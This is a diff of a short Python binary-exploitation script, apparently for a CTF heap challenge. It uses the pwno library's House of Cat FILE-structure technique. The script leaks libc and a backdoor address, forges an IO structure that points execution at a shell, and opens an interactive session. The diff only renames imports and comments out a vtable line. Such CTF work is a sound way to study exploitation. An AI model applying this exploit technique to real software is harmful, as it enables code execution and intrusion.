@@ -1,5 +1,5 @@
-from src.pwno.helper.IO import house_of_cat
-from src.pwno import *
+from pwno.helper.IO import HouseOfCat
+from pwno import *
 
 
 sh = gen_sh()
@@ -10,12 +10,12 @@ libc.address = int(recvl(keepends=False), 16) - libc.sym['puts']
 sh.recvuntil(b'backd00r: ')
 backd00r = int(recvl(keepends=False), 16)
 
-cat = house_of_cat()
+cat = HouseOfCat()
 cat.fake_io_addr = heap
 cat.rdi = b"/bin/sh\x00"
 cat.rdx = p64(0xcafec0de)
 cat.call_addr = p64(backd00r)
-cat.vtable = p64(libc.sym['_IO_wfile_jumps'] + 0x30)
+# cat.vtable = p64(libc.sym['_IO_wfile_jumps'] + 0x30)
 
 send(bytes(cat))
 ia()
